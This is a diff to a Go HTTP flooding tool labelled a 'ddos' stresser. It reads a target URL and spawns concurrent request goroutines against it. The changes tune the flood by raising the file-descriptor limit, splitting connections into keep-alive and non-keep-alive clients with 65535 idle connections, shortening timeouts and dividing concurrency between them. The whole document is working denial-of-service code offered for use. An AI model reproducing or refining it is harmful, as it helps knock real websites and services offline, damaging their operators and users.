@@ -7,6 +7,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"runtime"
 	"strings"
 	"sync"
@@ -94,29 +95,49 @@ func parseHost(url string) string {
 	return url
 }
 
+func setUlimit() {
+	cmd := exec.Command("ulimit", "-n", "65535")
+	cmd.Run()
+}
+
 func main() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
+	setUlimit()
 	banner()
+
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Print(P + "╔═[ddos]Dizflyze Streser]\n╚═══➤ " + P)
 	url, _ := reader.ReadString('\n')
 	url = strings.TrimSpace(url)
 
-	duration := 260 * time.Second
+	duration := 60 * time.Second
 	stop := make(chan struct{})
 	var wg sync.WaitGroup
 
-	tr := &http.Transport{
+	tr1 := &http.Transport{
 		MaxIdleConns:        65535,
 		MaxIdleConnsPerHost: 65535,
-		IdleConnTimeout:     90 * time.Second,
+		IdleConnTimeout:     2 * time.Second,
 		DisableKeepAlives:   false,
 	}
-	client := &http.Client{Transport: tr, Timeout: 4 * time.Second}
+	client1 := &http.Client{Transport: tr1, Timeout: 2 * time.Second}
 
-	for i := 0; i < concurrency; i++ {
+	tr2 := &http.Transport{
+		MaxIdleConns:        65535,
+		MaxIdleConnsPerHost: 65535,
+		IdleConnTimeout:     2 * time.Second,
+		DisableKeepAlives:   true,
+	}
+	client2 := &http.Client{Transport: tr2, Timeout: 2 * time.Second}
+
+	half := concurrency / 2
+	for i := 0; i < half; i++ {
 		wg.Add(1)
-		go attack(url, client, stop, &wg)
+		go attack(url, client1, stop, &wg)
+	}
+	for i := 0; i < half; i++ {
+		wg.Add(1)
+		go attack(url, client2, stop, &wg)
 	}
 
 	time.Sleep(duration)
